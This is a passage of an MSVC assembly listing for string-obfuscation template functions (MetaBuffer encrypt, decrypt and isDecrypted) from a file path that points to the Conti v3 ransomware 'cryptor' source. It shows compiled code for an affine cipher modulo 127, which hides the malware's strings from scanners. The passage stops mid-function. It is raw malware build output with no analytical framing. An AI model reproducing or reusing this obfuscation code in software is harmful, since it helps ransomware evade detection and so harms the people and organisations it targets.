;	COMDAT ?encrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 0c	 add	 eax, 12
  00006	44 6b c0 07	 imul	 r8d, eax, 7
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 67	 sub	 eax, 103		; 00000067H
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 67	 add	 r8d, 103		; 00000067H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
